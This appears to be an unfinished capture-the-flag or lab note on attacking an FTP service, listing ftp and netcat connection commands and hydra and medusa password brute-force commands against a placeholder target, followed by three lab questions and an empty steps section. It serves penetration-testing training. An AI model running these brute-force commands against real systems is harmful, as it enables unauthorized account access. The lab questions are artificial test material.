```ftp $TARGET_IP```
```nc -v $TARGET_IP $PORT```
```hydra -L users.list -P /usr/share/wordlists/rockyou.txt ftp://$TARGET_IP```
```hydra -l $USERNAME -P /usr/share/wordlists/rockyou.txt ftp://$TARGET_IP```
```medusa -u $USERNAME -P /usr/share/wordlists/rockyou.txt -h $TARGET_IP -M ftp```

## Questions:
1. What port is the FTP service running on? 

2. What username is available for the FTP server? 

3. Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer. 

## Steps:
1. 